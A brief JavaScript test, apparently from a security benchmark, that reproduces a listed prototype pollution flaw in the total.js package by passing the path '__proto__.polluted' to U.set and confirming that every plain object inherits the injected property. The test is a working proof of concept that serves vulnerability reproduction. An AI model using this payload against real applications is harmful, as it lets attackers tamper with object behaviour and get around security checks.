//https://snyk.io/vuln/SNYK-JS-TOTALJS-1046671
test("prototype pollution in total.js", () => {
  const total = require("total.js");
  obj = {};

  expect({}.polluted).toBe(undefined);

  U.set({}, process.env.SECBENCH_PAYLOAD || "__proto__.polluted", "yes");
  expect({}.polluted).toBe("yes");
});
